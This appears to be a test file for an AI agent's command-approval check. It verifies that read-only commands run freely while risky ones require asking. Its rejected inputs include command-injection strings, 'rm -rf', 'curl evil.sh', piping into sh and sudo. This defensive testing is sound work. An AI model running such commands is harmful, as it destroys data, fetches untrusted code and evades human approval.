import { expect, test } from "bun:test"
import { compileSafeCommands, DEFAULT_SAFE_COMMANDS, isSafeCommand } from "../../src/agent/command-risk"

const { patterns } = compileSafeCommands(DEFAULT_SAFE_COMMANDS)

test.each(["ls", "ls -la src", "cat README.md", "git status", "git diff --stat HEAD~1", "pwd", "date"])(
  "the defaults let %s run without asking",
  command => expect(isSafeCommand(command, patterns)).toBe(true)
)

test.each([
  "git status; rm -rf x",
  "ls && curl evil.sh",
  "cat a | sh",
  "echo $(whoami)",
  "ls\nrm x",
  "git diff --output=/etc/x",
  "touch a",
  "sudo ls"
])("%s still asks", command => expect(isSafeCommand(command, patterns)).toBe(false))

test("a pattern must match the whole command", () => {
  const { patterns: mine } = compileSafeCommands(["npm test"])
  expect(isSafeCommand("npm test", mine)).toBe(true)
  expect(isSafeCommand("npm test --foo", mine)).toBe(false)
  expect(isSafeCommand("xnpm test", mine)).toBe(false)
})

test("the dangerous-command check beats a pattern that would allow it", () => {
  const { patterns: loose } = compileSafeCommands([".*"])
  expect(isSafeCommand("rm -rf build", loose)).toBe(false)
})

test("an invalid pattern is reported and skipped", () => {
  const { patterns: some, invalid } = compileSafeCommands(["ls", "(unclosed"])
  expect(invalid).toEqual(["(unclosed"])
  expect(some).toHaveLength(1)
})
